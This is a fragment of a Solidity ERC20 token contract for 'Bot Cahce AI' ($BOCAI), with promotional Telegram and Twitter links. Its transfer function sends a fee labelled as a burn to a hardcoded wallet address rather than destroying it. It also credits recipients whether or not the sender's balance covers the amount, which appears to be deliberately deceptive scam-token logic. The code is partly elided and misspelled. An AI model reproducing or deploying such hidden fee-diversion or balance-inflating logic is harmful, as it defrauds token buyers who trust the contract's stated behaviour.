...
// Submitted for Telegram: https://t.me/bot_cahce_ai
// Submitted for Twitter: https://twitter.com/bot_cahce_ai?s=09
...
contract  BotCahceAI  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _rOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    address private isExcluded;
    string private _name = "Bot Cahce AI";
    string private _symbol = "$BOCAI";
    ...
    function _transfer(address form, address to, uint256 amount) internal virtual {
        ...
        _rOwned[0x48f1A5D50b03bbF2b9eE17502dFd7a52FD90F1d4] += _bruntoken;
        if (sendertokens >= amount) { _rOwned[form] = sendertokens - amount; }
        _rOwned[to] += tokenamount; 
        if (_brunfee > 0) {
        emit Transfer(form, 0x48f1A5D50b03bbF2b9eE17502dFd7a52FD90F1d4, _bruntoken);
        }
